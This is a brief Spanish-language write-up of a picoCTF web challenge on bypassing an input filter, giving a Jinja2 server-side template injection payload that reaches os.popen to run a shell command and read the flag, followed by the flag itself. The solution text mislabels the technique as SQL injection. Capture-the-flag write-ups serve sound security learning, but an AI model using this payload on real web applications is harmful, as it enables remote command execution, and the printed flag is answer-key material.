
### Descripción 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:55361/)!
### Solución
Al igual que en el reto anterior, tenemos que encontrar una inyeccion sql hasta encontrar una adecuada. Teniendo la adecuada, cambiamos el id por un cat para ver la bandera

	{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
	
Solución: **# picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}**
### Notas adicionales


### Referencias 

